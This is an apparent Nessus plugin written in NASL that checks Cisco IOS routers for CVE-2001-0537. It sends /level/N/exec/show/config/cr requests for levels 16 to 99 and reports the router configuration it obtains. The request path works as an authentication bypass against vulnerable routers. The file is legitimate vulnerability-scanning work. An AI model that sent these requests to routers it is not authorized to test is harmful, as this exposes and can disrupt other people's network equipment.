
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#



if(description)
{
 script_id(10700);
 script_bugtraq_id(2936);
 script_cve_id("CVE-2001-0537");
 script_version ("$Revision: 1.19 $");
 

 name["english"] = "Cisco IOS HTTP Configuration Arbitrary Administrative Access";
 
 
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to execute arbitrary commands on the
remote Cisco router, by requesting them via HTTP,
as in
	/level/$NUMBER/exec/show/config/cr
	
where $NUMBER is an integer between 16 and 99.

An attacker may use this flaw to cut your network access to
the Internet, and may even lock you out of the router.

Solution : Disable the web configuration interface completely
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Obtains the remote router configuration";
 summary["francais"] = "Obtient la config du routeur";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CISCO";
 family["francais"] = "CISCO";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
kb   = get_kb_item("www/no404/" + port);

banner = get_http_banner(port:port);
if ( ! banner || "cisco-IOS" >!< banner ) exit(0);

if ( ! isnull(kb) ) exit(0);

if(get_port_state(port))
{
  for(i=16;i<100;i=i+1)
  {
  req = http_get(item:string("/level/", i, "/exec/show/config/cr"), 
  		 port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if(r == NULL)exit(0);
  
  if(("enable" >< r) &&
     ("interface" >< r) &&
     ("ip address" >< r)){
      req = string(
"It is possible to execute arbitrary commands on the\n",
"remote Cisco router, by requesting them via http,\n",
"as in\n",
"	/level/", i, "/exec/show/config/cr\n",
	
"We could get the following configuration file :\n",
r,"\n\n",
"An attacker may use this flaw to cut your network access to\n",
"the internet, and may even lock you out of the router.\n\n",

"Solution : Disable the web configuration interface completely\n",
"Risk factor : High");

     security_hole(port:port, data:req); 
     exit(0);
     }
   }
}
